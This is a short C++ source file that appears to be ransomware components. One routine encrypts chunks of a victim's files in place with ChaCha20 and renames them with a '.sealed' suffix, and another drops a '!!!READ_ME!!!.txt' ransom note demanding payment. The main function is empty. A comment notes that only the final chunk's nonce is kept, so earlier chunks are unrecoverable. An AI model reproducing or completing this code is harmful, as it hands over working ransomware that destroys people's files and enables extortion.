#include <array>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <string>

namespace fs = std::filesystem;

extern "C" void randombytes_buf(void *buf, std::size_t size);
extern "C" int crypto_stream_chacha20_ietf_xor(
    unsigned char *ciphertext, const unsigned char *plaintext,
    unsigned long long length, const unsigned char *nonce,
    const unsigned char *key);

static constexpr std::size_t kLargeFile = 131072;
static constexpr std::size_t kChunkLimit = 32768;
static constexpr char kSuffix[] = ".sealed";
static constexpr char kNote[] = "!!!READ_ME!!!.txt";

void encrypt_file(const fs::path &path, const std::array<unsigned char, 32> &key) {
  std::fstream file(path, std::ios::in | std::ios::out | std::ios::binary);
  const auto file_size = fs::file_size(path);
  const std::size_t rounds = file_size > kLargeFile ? 4 : 1;
  const std::size_t quarter = file_size / rounds;
  std::array<unsigned char, 12> nonce{};

  for (std::size_t index = 0; index < rounds; ++index) {
    const std::size_t offset = quarter * index;
    const std::size_t length = std::min(kChunkLimit, file_size - offset);
    std::string plaintext(length, '\0');
    std::string ciphertext(length, '\0');
    file.seekg(offset);
    file.read(plaintext.data(), static_cast<std::streamsize>(length));
    randombytes_buf(nonce.data(), nonce.size());
    crypto_stream_chacha20_ietf_xor(
        reinterpret_cast<unsigned char *>(ciphertext.data()),
        reinterpret_cast<const unsigned char *>(plaintext.data()), length,
        nonce.data(), key.data());
    file.seekp(offset);
    file.write(ciphertext.data(), static_cast<std::streamsize>(length));
  }

  // The shared nonce buffer retains only the final chunk's nonce.
  file.seekp(0, std::ios::end);
  file.write(reinterpret_cast<const char *>(nonce.data()), nonce.size());
  fs::rename(path, path.string() + kSuffix);
}

void drop_note(const fs::path &directory) {
  std::ofstream(directory / kNote)
      << "Your files were encrypted. Follow the payment instructions.";
}

int main() { return 0; }
